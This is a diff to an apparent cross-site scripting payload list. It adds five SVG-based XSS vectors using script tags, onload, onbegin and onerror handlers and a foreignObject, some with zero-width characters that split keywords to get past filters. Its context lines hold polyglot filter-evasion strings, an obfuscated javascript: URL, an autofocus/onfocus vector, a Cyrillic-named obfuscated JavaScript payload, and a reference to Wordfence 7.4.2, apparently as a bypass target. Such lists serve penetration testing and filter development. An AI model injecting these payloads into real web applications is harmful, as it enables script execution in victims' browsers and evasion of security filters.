@@ -1,3 +1,8 @@
+<svg xmlns="http://w3.org/2000/svg"><​script>alert(2)<​/script></svg>
+<svg xmlns="http://w3.org/2000/svg" onload​=alert(2)></svg>
+<svg xmlns="http://w3.org/2000/svg"><animate onbegin​=alert(2) attributeName=x dur=1s></animate></svg>
+<svg xmlns="http://w3.org/2000/svg"><image href=x onerror​=alert(2)></image></svg>
+<svg xmlns="http://w3.org/2000/svg"><foreignObject width="400" height="400"><body xmlns="https://w3.org"><​script>alert(2)<​/script></body></foreignObject></svg>
 <svg xmlns="http://w3.org/2000/svg" onload="this.setAttribute('onmouseover','confirm(1)')"></svg>
  /*-/*`/*\`/*%27/*%22/**/(/*%20*/oNcliCk=alert()%20)//%0D%0A%0d%0a//%3C/stYle/%3C/titLe/%3C/teXtarEa/%3C/scRipt/--!%3E\x3csVg/%3CsVg/oNloAd=alert()//%3E\x3e
 javascript:window['al'+'er'+(['t','b','c'][0])](origin)
@@ -1749,6 +1754,7 @@ Wordfence 7.4.2
 <lol/contenteditable/autofocus/onfocus="alert(1)">
 а='',б=!а+а,в=!б+а,г=а+{},д=б[а++],е=б[ж=а],
 з=++ж+а,и=г[ж+з],б[и+=г[а]+(б.в+г)[а]+в[з]+д+е+б[ж]+и+д+г[а]+е][и](в[а]+в[ж]+б[з]+е+д+"('взломано')")()
+
 
 
 
